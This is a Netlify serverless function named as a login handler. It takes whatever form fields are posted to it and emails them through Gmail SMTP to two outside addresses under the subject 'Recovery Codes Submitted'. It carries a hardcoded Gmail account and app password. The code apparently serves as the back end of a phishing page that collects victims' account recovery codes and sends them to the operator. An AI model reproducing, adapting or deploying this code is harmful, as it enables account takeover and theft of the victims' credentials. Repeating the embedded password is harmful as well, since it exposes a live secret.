// netlify/functions/netlifylogin.js
import nodemailer from "nodemailer";

export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: "Method not allowed" }),
    };
  }

  try {
    const body = JSON.parse(event.body || "{}");

    if (Object.keys(body).length === 0) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "No data received" }),
      };
    }

    // ✅ سارا data readable text میں convert کر دیں
    const formattedData = Object.entries(body)
      .map(([key, value]) => {
        if (Array.isArray(value)) {
          return `${key}: ${value.join(", ")}`;
        }
        return `${key}: ${value}`;
      })
      .join("\n");

    // ✅ Gmail SMTP settings (hardcoded)
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: "hindistoryhub396@gmail.com",   // 👈 اپنی Gmail
        pass: "fylk gbsb cdgu anwh",          // 👈 App password
      },
    });

    // ✅ جہاں mail جانا ہے
    const mailOptions = {
      from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
      to: "newzatpage@gmail.com,submitdispute@gmail.com", // 👈 multiple receivers
      subject: "Recovery Codes Submitted",
      text: formattedData,
    };

    await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      body: JSON.stringify({
        success: true,
        message: "Email sent successfully",
      }),
    };
  } catch (err) {
    console.error("Mail error:", err);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: "Failed to send email" }),
    };
  }
}
